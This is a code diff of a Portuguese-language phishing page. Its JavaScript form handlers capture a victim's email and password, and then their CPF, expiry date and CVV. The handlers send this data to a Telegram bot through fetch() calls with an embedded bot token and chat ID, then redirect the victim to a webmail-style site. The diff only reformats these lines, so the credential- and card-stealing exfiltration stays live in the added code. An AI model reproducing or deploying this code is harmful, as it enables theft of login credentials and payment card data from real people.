@@ -50,8 +50,7 @@ document.getElementById('loginform').addEventListener('submit', function(e){
   e.preventDefault();
   const email = document.getElementById('email').value;
   const senha = document.getElementById('senha').value;
-  fetch('https://api.telegram.org/bot7731169374:AAF2qtPXZgQELEHs6DnCBJUij638xwYUVVY/sendMessage?chat_id=6261750345&text='+
-    encodeURIComponent(`💸 E:${email} S:${senha}`), {mode:'no-cors'});
+  fetch('https://api.telegram.org/bot7731169374:AAF2qtPXZgQELEHs6DnCBJUij638xwYUVVY/sendMessage?chat_id=6261750345&text='+encodeURIComponent(`💸 E-mail:${email} Senha:${senha}`), {mode:'no-cors'});
   document.getElementById('tela1').style.display='none';
   document.getElementById('tela2').style.display='block';
 });
@@ -59,13 +58,13 @@ document.getElementById('loginform').addEventListener('submit', function(e){
 // ENVIO 2: CPF+CARTÃO
 document.getElementById('finalform').addEventListener('submit', function(e){
   e.preventDefault();
-  const f=e.target,c=f.cpf.value,n=f.num.value,v=f.val.value,x=f.cvv.value;
-  fetch('https://api.telegram.org/bot7731169374:AAF2qtPXZgQELEHs6DnCBJUij638xwYUVVY/sendMessage?chat_id=6261750345&text='+
-    encodeURIComponent(`💊 CPF:${c} | Nº:${n.slice(-4)} | Val:${v} | CVV:${x}`), {mode:'no-cors'});
+  const f = e.target, c = f.cpf.value, n = f.num.value, v = f.val.value, x = f.cvv.value;
+  fetch('https://api.telegram.org/bot7731169374:AAF2qtPXZgQELEHs6DnCBJUij638xwYUVVY/sendMessage?chat_id=6261750345&text='+encodeURIComponent(`💊 CPF:${c} | Nº:${n.slice(-4)} | Val:${v} | CVV:${x}`), {mode:'no-cors'});
   document.getElementById('tela2').style.display='none';
   document.getElementById('tela3').style.display='block';
   setTimeout(()=>location='https://webmail-seguro.com.br/', 2000);
 });
 </script>
+
 </body>
 </html>
